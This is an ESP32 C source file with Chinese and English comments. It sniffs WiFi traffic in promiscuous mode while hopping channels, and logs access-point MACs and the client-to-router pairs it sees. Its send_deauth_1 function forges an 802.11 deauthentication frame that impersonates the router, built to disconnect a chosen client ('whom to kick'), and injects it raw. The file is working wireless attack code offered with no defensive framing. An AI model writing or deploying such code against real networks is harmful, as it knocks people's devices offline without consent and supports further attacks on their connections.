#include "wifi_driver.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_mac.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include <string.h>
QueueHandle_t xQueue_ap_info;
static uint8_t channel =1;
static esp_timer_handle_t timer_handle;
//Construct mac frame head
#pragma pack(1)
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} ieee80211_frame_header_t;
#pragma pack()

void change_channel(void* arg) // a task for change channel every 200ms
{
    esp_wifi_set_channel(channel,WIFI_SECOND_CHAN_NONE);
    channel =(channel % 13 )+1;
}

void sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
        
    wifi_promiscuous_pkt_t *pkt=(wifi_promiscuous_pkt_t *)buf;
    if(pkt->rx_ctrl.sig_len< sizeof(ieee80211_frame_header_t))return;
    ieee80211_frame_header_t *hdr =(ieee80211_frame_header_t *)pkt->payload;

    uint8_t channle= pkt->rx_ctrl.channel;
    uint8_t frame_type = (hdr->frame_ctrl & 0x000C) >>2;
    uint8_t frame_subtype = (hdr->frame_ctrl & 0x00F0) >>4;

    if(frame_type ==0 && frame_subtype ==8)
    {
    //printf("fing ap mac is "MACSTR" \n",MAC2STR(hdr->addr2));
    uint8_t temp[6];
    memcpy(temp,hdr->addr2,6);
    BaseType_t xHigherPriorityTaskWoken = pdFALSE;
    xQueueSendFromISR(xQueue_ap_info,temp,&xHigherPriorityTaskWoken);
    }
    if (frame_type == 2 && frame_subtype == 0)  //find data frame
    {
        if (hdr->addr2[0] != 0xFF && hdr->addr2[0] != 0x00)
        {
            printf("DATA: " MACSTR " → " MACSTR " (phone→router)",MAC2STR(hdr->addr2), MAC2STR(hdr->addr3));
            printf(" ,CH:%d\n",channle);
        }
    }
}





#pragma pack(1)
typedef struct {
    uint16_t frame_ctrl;      // 0x00C0 = Deauth
    uint16_t duration;        // 0
    uint8_t  addr1[6];        // 目标（手机 MAC）
    uint8_t  addr2[6];        // 源（冒充的路由器 MAC）
    uint8_t  addr3[6];        // BSSID（同 addr2）
    uint16_t seq_ctrl;        // 序列号
    uint16_t reason_code;     // 原因码
} deauth_frame_t;
#pragma pack()

void send_deauth_1(const uint8_t *target_mac, const uint8_t *ap_mac, uint8_t ch)
{
    deauth_frame_t frame;

    frame.frame_ctrl  = 0x00C0;   // 管理帧, subtype=12 (deauth)
    frame.duration    = 0x0000;
    memcpy(frame.addr1, target_mac, 6);  // 踢谁
    memcpy(frame.addr2, ap_mac, 6);      // 冒充谁
    memcpy(frame.addr3, ap_mac, 6);      // BSSID
    frame.seq_ctrl    = 0;
    frame.reason_code = 0x0007;          // 常见原因：未关联

    // 切到目标信道
    esp_timer_stop(timer_handle);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(20));

    // 发送，en_sys_seq=true 让驱动自动填序列号
    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true);

    printf("[DEAUTH] Sent: " MACSTR " → " MACSTR " (impersonating AP), CH:%d\n",
           MAC2STR(ap_mac), MAC2STR(target_mac), ch);
}




void init_sniffer()
{
    esp_netif_init();
    esp_event_loop_create_default();

    wifi_init_config_t t=WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&t);

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    xQueue_ap_info =xQueueCreate(10,sizeof(uint8_t[6]));
    esp_wifi_set_promiscuous_rx_cb(sniffer_cb);//set callbacke function
    esp_wifi_set_promiscuous(true);//start sniffer mode

    //create timer for change_channel
    const esp_timer_create_args_t arg ={
        .callback=change_channel,
    };
    esp_timer_create(&arg,&timer_handle);
    esp_timer_start_periodic(timer_handle,200000);
}